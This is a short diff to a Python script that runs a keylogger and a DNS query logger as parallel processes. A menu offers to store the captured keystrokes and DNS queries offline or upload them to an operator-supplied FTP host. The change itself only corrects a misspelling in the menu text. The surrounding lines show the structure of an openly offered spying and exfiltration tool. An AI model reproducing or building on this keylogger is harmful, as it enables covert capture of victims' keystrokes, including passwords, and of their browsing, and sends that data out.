@@ -25,7 +25,7 @@ def main():
     p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
     p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
     while True:
-        service_choise = int( input("Choose what service you want. \n 1. Key and Dns Quary logger with offline and ftp upload. \n 2. Key and Dns Quary logger offline Only.  \n 3. Key logger only with offline and ftp upload. \n 4. Key logger offline Only. \n 5. Dns Quary logger offline and ftp upload. \n 6. Dns Quary logger offline. \n 7. Exit \n"))
+        service_choise = int( input("Choose what service you want. \n 1. Key and Dns Query logger with offline and ftp upload. \n 2. Key and Dns Query logger offline Only.  \n 3. Key logger only with offline and ftp upload. \n 4. Key logger offline Only. \n 5. Dns Query logger offline and ftp upload. \n 6. Dns Query logger offline. \n 7. Exit \n"))
         match service_choise:
             case 1:
                 p2 = multiprocessing.Process(target=sync, args=( input("Ftp Host/Ip:"), input("Ftp Username:"), input("Ftp Passward:")), name="SyncFtp")
